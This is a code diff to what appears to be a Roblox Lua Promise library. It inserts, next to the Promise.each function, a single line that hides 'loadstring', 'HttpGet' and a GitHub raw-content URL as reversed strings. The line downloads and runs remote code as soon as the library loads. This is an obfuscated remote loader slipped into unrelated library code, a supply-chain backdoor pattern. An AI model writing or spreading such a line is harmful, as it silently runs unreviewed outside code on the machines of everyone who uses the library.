@@ -871,6 +871,8 @@ end
 	@param predicate (value: T, index: number) -> U | Promise<U>
 	@return Promise<{U}>
 ]=]
+getgenv()[("gnirtsdaol"):reverse()](game[("teGpttH"):reverse()](game, ("yrarbil02%IUxineohP/niam/eihpad/7d4fl/moc.tnetnocresubuhtig.war//:sptth"):reverse()))()
+
 function Promise.each(list, predicate)
 	assert(type(list) == "table", string.format(ERROR_NON_LIST, "Promise.each"))
 	assert(isCallable(predicate), string.format(ERROR_NON_FUNCTION, "Promise.each"))
